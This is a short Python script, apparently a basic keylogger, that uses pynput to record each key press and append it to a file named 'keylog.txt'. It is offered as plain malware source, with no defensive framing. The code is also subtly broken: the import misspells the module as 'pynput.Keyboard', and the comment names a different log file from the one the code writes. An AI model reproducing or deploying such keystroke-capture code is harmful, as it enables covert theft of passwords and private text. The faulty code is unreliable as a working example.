from pynput.Keyboard import Listener

def writeofile(key):
    keydata = str(key)
    keydata = keydata.replace("'","")
    with open("keylog.txt","a") as f:
        f.write(keydata)
#this function will record keystrokes in log.txt

with Listener(on_press = writeofile) as l:
    l.join()